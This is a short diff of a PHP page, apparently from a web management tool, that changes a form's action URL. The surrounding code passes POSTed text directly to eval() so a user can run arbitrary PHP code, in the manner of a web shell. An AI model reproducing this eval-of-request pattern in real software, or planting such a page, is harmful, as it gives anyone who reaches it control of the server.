@@ -7,7 +7,7 @@ appheader('-执行命令',$action);
 if($code!=null){
     eval(stripslashes($code));
 }else{
-     echo "<form method=\"post\" action=\"cmd.php?action=move\">\n你可以在此处执行任意php代码:(禁用函数:<font color=\"red\">".get_cfg_var("disable_functions")."</font>)<br />\n<textarea rows=\"10\" cols=\"60\" name=\"code\" type=\"text\" onkeydown=\"if(event.ctrlKey&&event.keyCode==13){document.getElementById('Submit').click();return false};\"></textarea><br />\n<input id=\"Submit\" type=\"submit\" value=\"执行命令\">";
+     echo "<form method=\"post\" action=\"cmd.php\">\n你可以在此处执行任意php代码:(禁用函数:<font color=\"red\">".get_cfg_var("disable_functions")."</font>)<br />\n<textarea rows=\"10\" cols=\"60\" name=\"code\" type=\"text\" onkeydown=\"if(event.ctrlKey&&event.keyCode==13){document.getElementById('Submit').click();return false};\"></textarea><br />\n<input id=\"Submit\" type=\"submit\" value=\"执行命令\">";
 }
 echo "<hr>\n&nbsp;<a href=\"cmd.php\">刷新页面</a>&nbsp;\n";
 appmenu();
